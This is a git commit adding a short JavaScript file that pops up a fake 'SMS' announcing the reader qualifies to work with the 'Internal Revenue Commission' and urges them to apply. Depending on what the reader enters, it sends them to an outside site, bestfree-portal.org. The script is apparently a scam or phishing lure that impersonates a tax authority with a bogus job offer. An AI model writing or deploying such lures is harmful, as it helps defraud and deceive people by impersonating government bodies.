1eaefec93b36a0cb66a6b261578ba0f64fe5e293
ebeekpo <imohdavid078@gmail.com>
2025-01-17 07:35:54 +0100

    Create internal-revenue-active.js

---
+++ internal-revenue-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the Internal Revenue Commission, Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://bestfree-portal.org/internal-revenue.html';
+}
